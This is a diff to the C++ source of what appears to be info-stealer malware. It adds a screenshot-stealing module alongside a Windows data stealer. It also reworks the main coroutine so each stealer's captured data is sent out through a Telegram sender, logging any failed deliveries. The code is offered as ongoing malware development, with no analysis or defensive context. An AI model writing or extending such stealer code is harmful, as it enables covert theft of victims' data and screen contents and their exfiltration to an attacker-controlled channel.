@@ -13,6 +13,7 @@
 #include "senders/sender.h"
 #include "senders/telegram_sender.h"
 #include "stealers/base_stealer.h"
+#include "stealers/srceenshot_stealer.h"
 #include "stealers/win_stealer.h"
 
 #if 0
@@ -120,16 +121,20 @@ asio::awaitable<void> co_main()
 
     std::vector<std::unique_ptr<base_stealer_t>> stealers;
     stealers.emplace_back(std::make_unique<win_stealer_t>());
-    stealers.emplace_back(std::make_unique<win_stealer_t>());
+    stealers.emplace_back(std::make_unique<srceenshot_stealer_t>());
 
     std::vector<asio::awaitable<void>> tasks;
     for (auto& st : stealers)
     {
-        tasks.emplace_back(([&sender, &st]() -> asio::awaitable<void>
+        auto func = [&sender](decltype(st)& st) -> asio::awaitable<void>
         {
             const auto result = co_await st->steal();
-            co_await sender->send_message(result);
-        })());
+            const auto response = co_await sender->send_message(result);
+            if(!response.at("ok").as_bool())
+                DLOG(response.at("description").as_string());
+        };
+
+        tasks.push_back(func(st));
     }
 
     co_await net::wait(tasks.begin(), tasks.end());
